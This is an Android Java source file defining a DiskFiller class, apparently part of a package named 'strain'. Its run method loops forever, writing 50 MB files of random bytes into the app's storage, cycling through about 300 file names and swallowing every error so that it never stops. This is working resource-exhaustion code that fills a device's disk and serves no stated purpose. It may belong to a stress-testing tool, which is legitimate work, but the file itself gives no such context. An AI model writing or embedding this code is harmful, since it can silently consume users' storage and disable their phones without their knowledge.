package com.rhfvnc.strain;
import android.content.Context;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;
public class DiskFiller implements Runnable {
    private final Context ctx;
    public DiskFiller(Context c) { ctx = c; }
    @Override
    public void run() {
        Random r = new Random();
        byte[] buf = new byte[1024 * 1024];
        r.nextBytes(buf);
        int idx = 0;
        while (true) {
            try {
                File dir = ctx.getExternalFilesDir(null);
                if (dir == null) dir = ctx.getFilesDir();
                File f = new File(dir, "junk_" + idx++ + ".bin");
                FileOutputStream fos = new FileOutputStream(f);
                for (int i = 0; i < 50; i++) fos.write(buf);
                fos.close();
                if (idx > 300) idx = 0;
            } catch (Throwable t) {
                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
            }
        }
    }
}
